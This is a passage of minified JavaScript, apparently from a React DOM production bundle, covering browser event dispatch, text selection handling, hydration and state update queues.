                        t = Z((e = t.contentWindow).document)
                    }
                    return t
                }

                function hr(e) {
                    var t = e && e.nodeName && e.nodeName.toLowerCase();
                    return t && ("input" === t && ("text" === e.type || "search" === e.type || "tel" === e.type || "url" === e.type || "password" === e.type) || "textarea" === t || "true" === e.contentEditable)
                }

                function pr(e) {
                    var t = fr(),
                        n = e.focusedElem,
                        r = e.selectionRange;
                    if (t !== n && n && n.ownerDocument && dr(n.ownerDocument.documentElement, n)) {
                        if (null !== r && hr(n))
                            if (t = r.start, void 0 === (e = r.end) && (e = t), "selectionStart" in n) n.selectionStart = t, n.selectionEnd = Math.min(e, n.value.length);
                            else if ((e = (t = n.ownerDocument || document) && t.defaultView || window).getSelection) {
                            e = e.getSelection();
                            var i = n.textContent.length,
                                o = Math.min(r.start, i);
                            r = void 0 === r.end ? o : Math.min(r.end, i), !e.extend && o > r && (i = r, r = o, o = i), i = ur(n, o);
                            var a = ur(n, r);
                            i && a && (1 !== e.rangeCount || e.anchorNode !== i.node || e.anchorOffset !== i.offset || e.focusNode !== a.node || e.focusOffset !== a.offset) && ((t = t.createRange()).setStart(i.node, i.offset), e.removeAllRanges(), o > r ? (e.addRange(t), e.extend(a.node, a.offset)) : (t.setEnd(a.node, a.offset), e.addRange(t)))
                        }
                        for (t = [], e = n; e = e.parentNode;) 1 === e.nodeType && t.push({
                            element: e,
                            left: e.scrollLeft,
                            top: e.scrollTop
                        });
                        for ("function" === typeof n.focus && n.focus(), n = 0; n < t.length; n++)(e = t[n]).element.scrollLeft = e.left, e.element.scrollTop = e.top
                    }
                }
                var mr = u && "documentMode" in document && 11 >= document.documentMode,
                    gr = null,
                    vr = null,
                    yr = null,
                    br = !1;

                function wr(e, t, n) {
                    var r = n.window === n ? n.document : 9 === n.nodeType ? n : n.ownerDocument;
                    br || null == gr || gr !== Z(r) || ("selectionStart" in (r = gr) && hr(r) ? r = {
                        start: r.selectionStart,
                        end: r.selectionEnd
                    } : r = {
                        anchorNode: (r = (r.ownerDocument && r.ownerDocument.defaultView || window).getSelection()).anchorNode,
                        anchorOffset: r.anchorOffset,
                        focusNode: r.focusNode,
                        focusOffset: r.focusOffset
                    }, yr && cr(yr, r) || (yr = r, 0 < (r = Wr(vr, "onSelect")).length && (t = new un("onSelect", "select", null, t, n), e.push({
                        event: t,
                        listeners: r
                    }), t.target = gr)))
                }

                function xr(e, t) {
                    var n = {};
                    return n[e.toLowerCase()] = t.toLowerCase(), n["Webkit" + e] = "webkit" + t, n["Moz" + e] = "moz" + t, n
                }
                var Ar = {
                        animationend: xr("Animation", "AnimationEnd"),
                        animationiteration: xr("Animation", "AnimationIteration"),
                        animationstart: xr("Animation", "AnimationStart"),
                        transitionend: xr("Transition", "TransitionEnd")
                    },
                    kr = {},
                    Er = {};

                function Sr(e) {
                    if (kr[e]) return kr[e];
                    if (!Ar[e]) return e;
                    var t, n = Ar[e];
                    for (t in n)
                        if (n.hasOwnProperty(t) && t in Er) return kr[e] = n[t];
                    return e
                }
                u && (Er = document.createElement("div").style, "AnimationEvent" in window || (delete Ar.animationend.animation, delete Ar.animationiteration.animation, delete Ar.animationstart.animation), "TransitionEvent" in window || delete Ar.transitionend.transition);
                var Cr = Sr("animationend"),
                    _r = Sr("animationiteration"),
                    Ir = Sr("animationstart"),
                    Pr = Sr("transitionend"),
                    Tr = new Map,
                    Br = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");

                function Nr(e, t) {
                    Tr.set(e, t), c(t, [e])
                }
                for (var Or = 0; Or < Br.length; Or++) {
                    var Rr = Br[Or];
                    Nr(Rr.toLowerCase(), "on" + (Rr[0].toUpperCase() + Rr.slice(1)))
                }
                Nr(Cr, "onAnimationEnd"), Nr(_r, "onAnimationIteration"), Nr(Ir, "onAnimationStart"), Nr("dblclick", "onDoubleClick"), Nr("focusin", "onFocus"), Nr("focusout", "onBlur"), Nr(Pr, "onTransitionEnd"), l("onMouseEnter", ["mouseout", "mouseover"]), l("onMouseLeave", ["mouseout", "mouseover"]), l("onPointerEnter", ["pointerout", "pointerover"]), l("onPointerLeave", ["pointerout", "pointerover"]), c("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" ")), c("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")), c("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]), c("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" ")), c("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" ")), c("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
                var Mr = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),
                    jr = new Set("cancel close invalid load scroll toggle".split(" ").concat(Mr));

                function Fr(e, t, n) {
                    var r = e.type || "unknown-event";
                    e.currentTarget = n,
                        function(e, t, n, r, i, a, s, c, l) {
                            if (Ue.apply(this, arguments), je) {
                                if (!je) throw Error(o(198));
                                var u = Fe;
                                je = !1, Fe = null, Le || (Le = !0, De = u)
                            }
                        }(r, t, void 0, e), e.currentTarget = null
                }

                function Lr(e, t) {
                    t = 0 !== (4 & t);
                    for (var n = 0; n < e.length; n++) {
                        var r = e[n],
                            i = r.event;
                        r = r.listeners;
                        e: {
                            var o = void 0;
                            if (t)
                                for (var a = r.length - 1; 0 <= a; a--) {
                                    var s = r[a],
                                        c = s.instance,
                                        l = s.currentTarget;
                                    if (s = s.listener, c !== o && i.isPropagationStopped()) break e;
                                    Fr(i, s, l), o = c
                                } else
                                    for (a = 0; a < r.length; a++) {
                                        if (c = (s = r[a]).instance, l = s.currentTarget, s = s.listener, c !== o && i.isPropagationStopped()) break e;
                                        Fr(i, s, l), o = c
                                    }
                        }
                    }
                    if (Le) throw e = De, Le = !1, De = null, e
                }

                function Dr(e, t) {
                    var n = t[mi];
                    void 0 === n && (n = t[mi] = new Set);
                    var r = e + "__bubble";
                    n.has(r) || (Gr(t, e, 2, !1), n.add(r))
                }

                function Hr(e, t, n) {
                    var r = 0;
                    t && (r |= 4), Gr(n, e, r, t)
                }
                var Ur = "_reactListening" + Math.random().toString(36).slice(2);

                function zr(e) {
                    if (!e[Ur]) {
                        e[Ur] = !0, a.forEach((function(t) {
                            "selectionchange" !== t && (jr.has(t) || Hr(t, !1, e), Hr(t, !0, e))
                        }));
                        var t = 9 === e.nodeType ? e : e.ownerDocument;
                        null === t || t[Ur] || (t[Ur] = !0, Hr("selectionchange", !1, t))
                    }
                }

                function Gr(e, t, n, r) {
                    switch (Jt(t)) {
                        case 1:
                            var i = Qt;
                            break;
                        case 4:
                            i = Wt;
                            break;
                        default:
                            i = Vt
                    }
                    n = i.bind(null, t, n, e), i = void 0, !Oe || "touchstart" !== t && "touchmove" !== t && "wheel" !== t || (i = !0), r ? void 0 !== i ? e.addEventListener(t, n, {
                        capture: !0,
                        passive: i
                    }) : e.addEventListener(t, n, !0) : void 0 !== i ? e.addEventListener(t, n, {
                        passive: i
                    }) : e.addEventListener(t, n, !1)
                }

                function qr(e, t, n, r, i) {
                    var o = r;
                    if (0 === (1 & t) && 0 === (2 & t) && null !== r) e: for (;;) {
                        if (null === r) return;
                        var a = r.tag;
                        if (3 === a || 4 === a) {
                            var s = r.stateNode.containerInfo;
                            if (s === i || 8 === s.nodeType && s.parentNode === i) break;
                            if (4 === a)
                                for (a = r.return; null !== a;) {
                                    var c = a.tag;
                                    if ((3 === c || 4 === c) && ((c = a.stateNode.containerInfo) === i || 8 === c.nodeType && c.parentNode === i)) return;
                                    a = a.return
                                }
                            for (; null !== s;) {
                                if (null === (a = yi(s))) return;
                                if (5 === (c = a.tag) || 6 === c) {
                                    r = o = a;
                                    continue e
                                }
                                s = s.parentNode
                            }
                        }
                        r = r.return
                    }
                    Be((function() {
                        var r = o,
                            i = xe(n),
                            a = [];
                        e: {
                            var s = Tr.get(e);
                            if (void 0 !== s) {
                                var c = un,
                                    l = e;
                                switch (e) {
                                    case "keypress":
                                        if (0 === tn(n)) break e;
                                    case "keydown":
                                    case "keyup":
                                        c = _n;
                                        break;
                                    case "focusin":
                                        l = "focus", c = gn;
                                        break;
                                    case "focusout":
                                        l = "blur", c = gn;
                                        break;
                                    case "beforeblur":
                                    case "afterblur":
                                        c = gn;
                                        break;
                                    case "click":
                                        if (2 === n.button) break e;
                                    case "auxclick":
                                    case "dblclick":
                                    case "mousedown":
                                    case "mousemove":
                                    case "mouseup":
                                    case "mouseout":
                                    case "mouseover":
                                    case "contextmenu":
                                        c = pn;
                                        break;
                                    case "drag":
                                    case "dragend":
                                    case "dragenter":
                                    case "dragexit":
                                    case "dragleave":
                                    case "dragover":
                                    case "dragstart":
                                    case "drop":
                                        c = mn;
                                        break;
                                    case "touchcancel":
                                    case "touchend":
                                    case "touchmove":
                                    case "touchstart":
                                        c = Pn;
                                        break;
                                    case Cr:
                                    case _r:
                                    case Ir:
                                        c = vn;
                                        break;
                                    case Pr:
                                        c = Tn;
                                        break;
                                    case "scroll":
                                        c = fn;
                                        break;
                                    case "wheel":
                                        c = Nn;
                                        break;
                                    case "copy":
                                    case "cut":
                                    case "paste":
                                        c = bn;
                                        break;
                                    case "gotpointercapture":
                                    case "lostpointercapture":
                                    case "pointercancel":
                                    case "pointerdown":
                                    case "pointermove":
                                    case "pointerout":
                                    case "pointerover":
                                    case "pointerup":
                                        c = In
                                }
                                var u = 0 !== (4 & t),
                                    d = !u && "scroll" === e,
                                    f = u ? null !== s ? s + "Capture" : null : s;
                                u = [];
                                for (var h, p = r; null !== p;) {
                                    var m = (h = p).stateNode;
                                    if (5 === h.tag && null !== m && (h = m, null !== f && (null != (m = Ne(p, f)) && u.push(Qr(p, m, h)))), d) break;
                                    p = p.return
                                }
                                0 < u.length && (s = new c(s, l, null, n, i), a.push({
                                    event: s,
                                    listeners: u
                                }))
                            }
                        }
                        if (0 === (7 & t)) {
                            if (c = "mouseout" === e || "pointerout" === e, (!(s = "mouseover" === e || "pointerover" === e) || n === we || !(l = n.relatedTarget || n.fromElement) || !yi(l) && !l[pi]) && (c || s) && (s = i.window === i ? i : (s = i.ownerDocument) ? s.defaultView || s.parentWindow : window, c ? (c = r, null !== (l = (l = n.relatedTarget || n.toElement) ? yi(l) : null) && (l !== (d = ze(l)) || 5 !== l.tag && 6 !== l.tag) && (l = null)) : (c = null, l = r), c !== l)) {
                                if (u = pn, m = "onMouseLeave", f = "onMouseEnter", p = "mouse", "pointerout" !== e && "pointerover" !== e || (u = In, m = "onPointerLeave", f = "onPointerEnter", p = "pointer"), d = null == c ? s : wi(c), h = null == l ? s : wi(l), (s = new u(m, p + "leave", c, n, i)).target = d, s.relatedTarget = h, m = null, yi(i) === r && ((u = new u(f, p + "enter", l, n, i)).target = h, u.relatedTarget = d, m = u), d = m, c && l) e: {
                                    for (f = l, p = 0, h = u = c; h; h = Vr(h)) p++;
                                    for (h = 0, m = f; m; m = Vr(m)) h++;
                                    for (; 0 < p - h;) u = Vr(u),
                                    p--;
                                    for (; 0 < h - p;) f = Vr(f),
                                    h--;
                                    for (; p--;) {
                                        if (u === f || null !== f && u === f.alternate) break e;
                                        u = Vr(u), f = Vr(f)
                                    }
                                    u = null
                                }
                                else u = null;
                                null !== c && Zr(a, s, c, u, !1), null !== l && null !== d && Zr(a, d, l, u, !0)
                            }
                            if ("select" === (c = (s = r ? wi(r) : window).nodeName && s.nodeName.toLowerCase()) || "input" === c && "file" === s.type) var g = Jn;
                            else if (qn(s))
                                if (Yn) g = ar;
                                else {
                                    g = ir;
                                    var v = rr
                                }
                            else(c = s.nodeName) && "input" === c.toLowerCase() && ("checkbox" === s.type || "radio" === s.type) && (g = or);
                            switch (g && (g = g(e, r)) ? Qn(a, g, n, i) : (v && v(e, s, r), "focusout" === e && (v = s._wrapperState) && v.controlled && "number" === s.type && ee(s, "number", s.value)), v = r ? wi(r) : window, e) {
                                case "focusin":
                                    (qn(v) || "true" === v.contentEditable) && (gr = v, vr = r, yr = null);
                                    break;
                                case "focusout":
                                    yr = vr = gr = null;
                                    break;
                                case "mousedown":
                                    br = !0;
                                    break;
                                case "contextmenu":
                                case "mouseup":
                                case "dragend":
                                    br = !1, wr(a, n, i);
                                    break;
                                case "selectionchange":
                                    if (mr) break;
                                case "keydown":
                                case "keyup":
                                    wr(a, n, i)
                            }
                            var y;
                            if (Rn) e: {
                                switch (e) {
                                    case "compositionstart":
                                        var b = "onCompositionStart";
                                        break e;
                                    case "compositionend":
                                        b = "onCompositionEnd";
                                        break e;
                                    case "compositionupdate":
                                        b = "onCompositionUpdate";
                                        break e
                                }
                                b = void 0
                            }
                            else zn ? Hn(e, n) && (b = "onCompositionEnd") : "keydown" === e && 229 === n.keyCode && (b = "onCompositionStart");
                            b && (Fn && "ko" !== n.locale && (zn || "onCompositionStart" !== b ? "onCompositionEnd" === b && zn && (y = en()) : (Xt = "value" in (Yt = i) ? Yt.value : Yt.textContent, zn = !0)), 0 < (v = Wr(r, b)).length && (b = new wn(b, e, null, n, i), a.push({
                                event: b,
                                listeners: v
                            }), y ? b.data = y : null !== (y = Un(n)) && (b.data = y))), (y = jn ? function(e, t) {
                                switch (e) {
                                    case "compositionend":
                                        return Un(t);
                                    case "keypress":
                                        return 32 !== t.which ? null : (Dn = !0, Ln);
                                    case "textInput":
                                        return (e = t.data) === Ln && Dn ? null : e;
                                    default:
                                        return null
                                }
                            }(e, n) : function(e, t) {
                                if (zn) return "compositionend" === e || !Rn && Hn(e, t) ? (e = en(), $t = Xt = Yt = null, zn = !1, e) : null;
                                switch (e) {
                                    case "paste":
                                    default:
                                        return null;
                                    case "keypress":
                                        if (!(t.ctrlKey || t.altKey || t.metaKey) || t.ctrlKey && t.altKey) {
                                            if (t.char && 1 < t.char.length) return t.char;
                                            if (t.which) return String.fromCharCode(t.which)
                                        }
                                        return null;
                                    case "compositionend":
                                        return Fn && "ko" !== t.locale ? null : t.data
                                }
                            }(e, n)) && (0 < (r = Wr(r, "onBeforeInput")).length && (i = new wn("onBeforeInput", "beforeinput", null, n, i), a.push({
                                event: i,
                                listeners: r
                            }), i.data = y))
                        }
                        Lr(a, t)
                    }))
                }

                function Qr(e, t, n) {
                    return {
                        instance: e,
                        listener: t,
                        currentTarget: n
                    }
                }

                function Wr(e, t) {
                    for (var n = t + "Capture", r = []; null !== e;) {
                        var i = e,
                            o = i.stateNode;
                        5 === i.tag && null !== o && (i = o, null != (o = Ne(e, n)) && r.unshift(Qr(e, o, i)), null != (o = Ne(e, t)) && r.push(Qr(e, o, i))), e = e.return
                    }
                    return r
                }

                function Vr(e) {
                    if (null === e) return null;
                    do {
                        e = e.return
                    } while (e && 5 !== e.tag);
                    return e || null
                }

                function Zr(e, t, n, r, i) {
                    for (var o = t._reactName, a = []; null !== n && n !== r;) {
                        var s = n,
                            c = s.alternate,
                            l = s.stateNode;
                        if (null !== c && c === r) break;
                        5 === s.tag && null !== l && (s = l, i ? null != (c = Ne(n, o)) && a.unshift(Qr(n, c, s)) : i || null != (c = Ne(n, o)) && a.push(Qr(n, c, s))), n = n.return
                    }
                    0 !== a.length && e.push({
                        event: t,
                        listeners: a
                    })
                }
                var Kr = /\r\n?/g,
                    Jr = /\u0000|\uFFFD/g;

                function Yr(e) {
                    return ("string" === typeof e ? e : "" + e).replace(Kr, "\n").replace(Jr, "")
                }

                function Xr(e, t, n) {
                    if (t = Yr(t), Yr(e) !== t && n) throw Error(o(425))
                }

                function $r() {}
                var ei = null,
                    ti = null;

                function ni(e, t) {
                    return "textarea" === e || "noscript" === e || "string" === typeof t.children || "number" === typeof t.children || "object" === typeof t.dangerouslySetInnerHTML && null !== t.dangerouslySetInnerHTML && null != t.dangerouslySetInnerHTML.__html
                }
                var ri = "function" === typeof setTimeout ? setTimeout : void 0,
                    ii = "function" === typeof clearTimeout ? clearTimeout : void 0,
                    oi = "function" === typeof Promise ? Promise : void 0,
                    ai = "function" === typeof queueMicrotask ? queueMicrotask : "undefined" !== typeof oi ? function(e) {
                        return oi.resolve(null).then(e).catch(si)
                    } : ri;

                function si(e) {
                    setTimeout((function() {
                        throw e
                    }))
                }

                function ci(e, t) {
                    var n = t,
                        r = 0;
                    do {
                        var i = n.nextSibling;
                        if (e.removeChild(n), i && 8 === i.nodeType)
                            if ("/$" === (n = i.data)) {
                                if (0 === r) return e.removeChild(i), void zt(t);
                                r--
                            } else "$" !== n && "$?" !== n && "$!" !== n || r++;
                        n = i
                    } while (n);
                    zt(t)
                }

                function li(e) {
                    for (; null != e; e = e.nextSibling) {
                        var t = e.nodeType;
                        if (1 === t || 3 === t) break;
                        if (8 === t) {
                            if ("$" === (t = e.data) || "$!" === t || "$?" === t) break;
                            if ("/$" === t) return null
                        }
                    }
                    return e
                }

                function ui(e) {
                    e = e.previousSibling;
                    for (var t = 0; e;) {
                        if (8 === e.nodeType) {
                            var n = e.data;
                            if ("$" === n || "$!" === n || "$?" === n) {
                                if (0 === t) return e;
                                t--
                            } else "/$" === n && t++
                        }
                        e = e.previousSibling
                    }
                    return null
                }
                var di = Math.random().toString(36).slice(2),
                    fi = "__reactFiber$" + di,
                    hi = "__reactProps$" + di,
                    pi = "__reactContainer$" + di,
                    mi = "__reactEvents$" + di,
                    gi = "__reactListeners$" + di,
                    vi = "__reactHandles$" + di;

                function yi(e) {
                    var t = e[fi];
                    if (t) return t;
                    for (var n = e.parentNode; n;) {
                        if (t = n[pi] || n[fi]) {
                            if (n = t.alternate, null !== t.child || null !== n && null !== n.child)
                                for (e = ui(e); null !== e;) {
                                    if (n = e[fi]) return n;
                                    e = ui(e)
                                }
                            return t
                        }
                        n = (e = n).parentNode
                    }
                    return null
                }

                function bi(e) {
                    return !(e = e[fi] || e[pi]) || 5 !== e.tag && 6 !== e.tag && 13 !== e.tag && 3 !== e.tag ? null : e
                }

                function wi(e) {
                    if (5 === e.tag || 6 === e.tag) return e.stateNode;
                    throw Error(o(33))
                }

                function xi(e) {
                    return e[hi] || null
                }
                var Ai = [],
                    ki = -1;

                function Ei(e) {
                    return {
                        current: e
                    }
                }

                function Si(e) {
                    0 > ki || (e.current = Ai[ki], Ai[ki] = null, ki--)
                }

                function Ci(e, t) {
                    ki++, Ai[ki] = e.current, e.current = t
                }
                var _i = {},
                    Ii = Ei(_i),
                    Pi = Ei(!1),
                    Ti = _i;

                function Bi(e, t) {
                    var n = e.type.contextTypes;
                    if (!n) return _i;
                    var r = e.stateNode;
                    if (r && r.__reactInternalMemoizedUnmaskedChildContext === t) return r.__reactInternalMemoizedMaskedChildContext;
                    var i, o = {};
                    for (i in n) o[i] = t[i];
                    return r && ((e = e.stateNode).__reactInternalMemoizedUnmaskedChildContext = t, e.__reactInternalMemoizedMaskedChildContext = o), o
                }

                function Ni(e) {
                    return null !== (e = e.childContextTypes) && void 0 !== e
                }

                function Oi() {
                    Si(Pi), Si(Ii)
                }

                function Ri(e, t, n) {
                    if (Ii.current !== _i) throw Error(o(168));
                    Ci(Ii, t), Ci(Pi, n)
                }

                function Mi(e, t, n) {
                    var r = e.stateNode;
                    if (t = t.childContextTypes, "function" !== typeof r.getChildContext) return n;
                    for (var i in r = r.getChildContext())
                        if (!(i in t)) throw Error(o(108, G(e) || "Unknown", i));
                    return F({}, n, r)
                }

                function ji(e) {
                    return e = (e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext || _i, Ti = Ii.current, Ci(Ii, e), Ci(Pi, Pi.current), !0
                }

                function Fi(e, t, n) {
                    var r = e.stateNode;
                    if (!r) throw Error(o(169));
                    n ? (e = Mi(e, t, Ti), r.__reactInternalMemoizedMergedChildContext = e, Si(Pi), Si(Ii), Ci(Ii, e)) : Si(Pi), Ci(Pi, n)
                }
                var Li = null,
                    Di = !1,
                    Hi = !1;

                function Ui(e) {
                    null === Li ? Li = [e] : Li.push(e)
                }

                function zi() {
                    if (!Hi && null !== Li) {
                        Hi = !0;
                        var e = 0,
                            t = bt;
                        try {
                            var n = Li;
                            for (bt = 1; e < n.length; e++) {
                                var r = n[e];
                                do {
                                    r = r(!0)
                                } while (null !== r)
                            }
                            Li = null, Di = !1
                        } catch (i) {
                            throw null !== Li && (Li = Li.slice(e + 1)), Ve($e, zi), i
                        } finally {
                            bt = t, Hi = !1
                        }
                    }
                    return null
                }
                var Gi = [],
                    qi = 0,
                    Qi = null,
                    Wi = 0,
                    Vi = [],
                    Zi = 0,
                    Ki = null,
                    Ji = 1,
                    Yi = "";

                function Xi(e, t) {
                    Gi[qi++] = Wi, Gi[qi++] = Qi, Qi = e, Wi = t
                }

                function $i(e, t, n) {
                    Vi[Zi++] = Ji, Vi[Zi++] = Yi, Vi[Zi++] = Ki, Ki = e;
                    var r = Ji;
                    e = Yi;
                    var i = 32 - at(r) - 1;
                    r &= ~(1 << i), n += 1;
                    var o = 32 - at(t) + i;
                    if (30 < o) {
                        var a = i - i % 5;
                        o = (r & (1 << a) - 1).toString(32), r >>= a, i -= a, Ji = 1 << 32 - at(t) + i | n << i | r, Yi = o + e
                    } else Ji = 1 << o | n << i | r, Yi = e
                }

                function eo(e) {
                    null !== e.return && (Xi(e, 1), $i(e, 1, 0))
                }

                function to(e) {
                    for (; e === Qi;) Qi = Gi[--qi], Gi[qi] = null, Wi = Gi[--qi], Gi[qi] = null;
                    for (; e === Ki;) Ki = Vi[--Zi], Vi[Zi] = null, Yi = Vi[--Zi], Vi[Zi] = null, Ji = Vi[--Zi], Vi[Zi] = null
                }
                var no = null,
                    ro = null,
                    io = !1,
                    oo = null;

                function ao(e, t) {
                    var n = Nl(5, null, null, 0);
                    n.elementType = "DELETED", n.stateNode = t, n.return = e, null === (t = e.deletions) ? (e.deletions = [n], e.flags |= 16) : t.push(n)
                }

                function so(e, t) {
                    switch (e.tag) {
                        case 5:
                            var n = e.type;
                            return null !== (t = 1 !== t.nodeType || n.toLowerCase() !== t.nodeName.toLowerCase() ? null : t) && (e.stateNode = t, no = e, ro = li(t.firstChild), !0);
                        case 6:
                            return null !== (t = "" === e.pendingProps || 3 !== t.nodeType ? null : t) && (e.stateNode = t, no = e, ro = null, !0);
                        case 13:
                            return null !== (t = 8 !== t.nodeType ? null : t) && (n = null !== Ki ? {
                                id: Ji,
                                overflow: Yi
                            } : null, e.memoizedState = {
                                dehydrated: t,
                                treeContext: n,
                                retryLane: 1073741824
                            }, (n = Nl(18, null, null, 0)).stateNode = t, n.return = e, e.child = n, no = e, ro = null, !0);
                        default:
                            return !1
                    }
                }

                function co(e) {
                    return 0 !== (1 & e.mode) && 0 === (128 & e.flags)
                }

                function lo(e) {
                    if (io) {
                        var t = ro;
                        if (t) {
                            var n = t;
                            if (!so(e, t)) {
                                if (co(e)) throw Error(o(418));
                                t = li(n.nextSibling);
                                var r = no;
                                t && so(e, t) ? ao(r, n) : (e.flags = -4097 & e.flags | 2, io = !1, no = e)
                            }
                        } else {
                            if (co(e)) throw Error(o(418));
                            e.flags = -4097 & e.flags | 2, io = !1, no = e
                        }
                    }
                }

                function uo(e) {
                    for (e = e.return; null !== e && 5 !== e.tag && 3 !== e.tag && 13 !== e.tag;) e = e.return;
                    no = e
                }

                function fo(e) {
                    if (e !== no) return !1;
                    if (!io) return uo(e), io = !0, !1;
                    var t;
                    if ((t = 3 !== e.tag) && !(t = 5 !== e.tag) && (t = "head" !== (t = e.type) && "body" !== t && !ni(e.type, e.memoizedProps)), t && (t = ro)) {
                        if (co(e)) throw ho(), Error(o(418));
                        for (; t;) ao(e, t), t = li(t.nextSibling)
                    }
                    if (uo(e), 13 === e.tag) {
                        if (!(e = null !== (e = e.memoizedState) ? e.dehydrated : null)) throw Error(o(317));
                        e: {
                            for (e = e.nextSibling, t = 0; e;) {
                                if (8 === e.nodeType) {
                                    var n = e.data;
                                    if ("/$" === n) {
                                        if (0 === t) {
                                            ro = li(e.nextSibling);
                                            break e
                                        }
                                        t--
                                    } else "$" !== n && "$!" !== n && "$?" !== n || t++
                                }
                                e = e.nextSibling
                            }
                            ro = null
                        }
                    } else ro = no ? li(e.stateNode.nextSibling) : null;
                    return !0
                }

                function ho() {
                    for (var e = ro; e;) e = li(e.nextSibling)
                }

                function po() {
                    ro = no = null, io = !1
                }

                function mo(e) {
                    null === oo ? oo = [e] : oo.push(e)
                }
                var go = w.ReactCurrentBatchConfig;

                function vo(e, t) {
                    if (e && e.defaultProps) {
                        for (var n in t = F({}, t), e = e.defaultProps) void 0 === t[n] && (t[n] = e[n]);
                        return t
                    }
                    return t
                }
                var yo = Ei(null),
                    bo = null,
                    wo = null,
                    xo = null;

                function Ao() {
                    xo = wo = bo = null
                }

                function ko(e) {
                    var t = yo.current;
                    Si(yo), e._currentValue = t
                }

                function Eo(e, t, n) {
                    for (; null !== e;) {
                        var r = e.alternate;
                        if ((e.childLanes & t) !== t ? (e.childLanes |= t, null !== r && (r.childLanes |= t)) : null !== r && (r.childLanes & t) !== t && (r.childLanes |= t), e === n) break;
                        e = e.return
                    }
                }

                function So(e, t) {
                    bo = e, xo = wo = null, null !== (e = e.dependencies) && null !== e.firstContext && (0 !== (e.lanes & t) && (ws = !0), e.firstContext = null)
                }

                function Co(e) {
                    var t = e._currentValue;
                    if (xo !== e)
                        if (e = {
                                context: e,
                                memoizedValue: t,
                                next: null
                            }, null === wo) {
                            if (null === bo) throw Error(o(308));
                            wo = e, bo.dependencies = {
                                lanes: 0,
                                firstContext: e
                            }
                        } else wo = wo.next = e;
                    return t
                }
                var _o = null;

                function Io(e) {
                    null === _o ? _o = [e] : _o.push(e)
                }

                function Po(e, t, n, r) {
                    var i = t.interleaved;
                    return null === i ? (n.next = n, Io(t)) : (n.next = i.next, i.next = n), t.interleaved = n, To(e, r)
                }

                function To(e, t) {
                    e.lanes |= t;
                    var n = e.alternate;
                    for (null !== n && (n.lanes |= t), n = e, e = e.return; null !== e;) e.childLanes |= t, null !== (n = e.alternate) && (n.childLanes |= t), n = e, e = e.return;
                    return 3 === n.tag ? n.stateNode : null
                }
                var Bo = !1;

                function No(e) {
                    e.updateQueue = {
                        baseState: e.memoizedState,
                        firstBaseUpdate: null,
                        lastBaseUpdate: null,
                        shared: {
                            pending: null,
                            interleaved: null,
                            lanes: 0
                        },
                        effects: null
                    }
                }

                function Oo(e, t) {
                    e = e.updateQueue, t.updateQueue === e && (t.updateQueue = {
                        baseState: e.baseState,
                        firstBaseUpdate: e.firstBaseUpdate,
                        lastBaseUpdate: e.lastBaseUpdate,
                        shared: e.shared,
                        effects: e.effects
                    })
                }

                function Ro(e, t) {
                    return {
                        eventTime: e,
                        lane: t,
                        tag: 0,
                        payload: null,
                        callback: null,
                        next: null
                    }
                }

                function Mo(e, t, n) {
                    var r = e.updateQueue;
                    if (null === r) return null;
                    if (r = r.shared, 0 !== (2 & Pc)) {
                        var i = r.pending;
                        return null === i ? t.next = t : (t.next = i.next, i.next = t), r.pending = t, To(e, n)
                    }
                    return null === (i = r.interleaved) ? (t.next = t, Io(r)) : (t.next = i.next, i.next = t), r.interleaved = t, To(e, n)
                }

                function jo(e, t, n) {
                    if (null !== (t = t.updateQueue) && (t = t.shared, 0 !== (4194240 & n))) {
                        var r = t.lanes;
                        n |= r &= e.pendingLanes, t.lanes = n, yt(e, n)
                    }
                }

                function Fo(e, t) {
                    var n = e.updateQueue,
                        r = e.alternate;
                    if (null !== r && n === (r = r.updateQueue)) {
                        var i = null,
                            o = null;
                        if (null !== (n = n.firstBaseUpdate)) {
                            do {
                                var a = {
                                    eventTime: n.eventTime,
                                    lane: n.lane,
                                    tag: n.tag,
                                    payload: n.payload,
                                    callback: n.callback,
                                    next: null
                                };
                                null === o ? i = o = a : o = o.next = a, n = n.next
                            } while (null !== n);
                            null === o ? i = o = t : o = o.next = t
                        } else i = o = t;
                        return n = {
                            baseState: r.baseState,
                            firstBaseUpdate: i,
                            lastBaseUpdate: o,
                            shared: r.shared,
                            effects: r.effects
                        }, void(e.updateQueue = n)
                    }
                    null === (e = n.lastBaseUpdate) ? n.firstBaseUpdate = t : e.next = t, n.lastBaseUpdate = t
                }

                function Lo(e, t, n, r) {
                    var i = e.updateQueue;
                    Bo = !1;
                    var o = i.firstBaseUpdate,
                        a = i.lastBaseUpdate,
                        s = i.shared.pending;
                    if (null !== s) {
                        i.shared.pending = null;
                        var c = s,
                            l = c.next;
                        c.next = null, null === a ? o = l : a.next = l, a = c;
                        var u = e.alternate;
                        null !== u && ((s = (u = u.updateQueue).lastBaseUpdate) !== a && (null === s ? u.firstBaseUpdate = l : s.next = l, u.lastBaseUpdate = c))
                    }
                    if (null !== o) {
                        var d = i.baseState;
                        for (a = 0, u = l = c = null, s = o;;) {
                            var f = s.lane,
                                h = s.eventTime;
                            if ((r & f) === f) {
                                null !== u && (u = u.next = {
                                    eventTime: h,
                                    lane: 0,
                                    tag: s.tag,
                                    payload: s.payload,
                                    callback: s.callback,
                                    next: null
                                });
                                e: {
                                    var p = e,
                                        m = s;
                                    switch (f = t, h = n, m.tag) {
                                        case 1:
                                            if ("function" === typeof(p = m.payload)) {
                                                d = p.call(h, d, f);
                                                break e
                                            }
                                            d = p;
                                            break e;
                                        case 3:
                                            p.flags = -65537 & p.flags | 128;
                                        case 0:
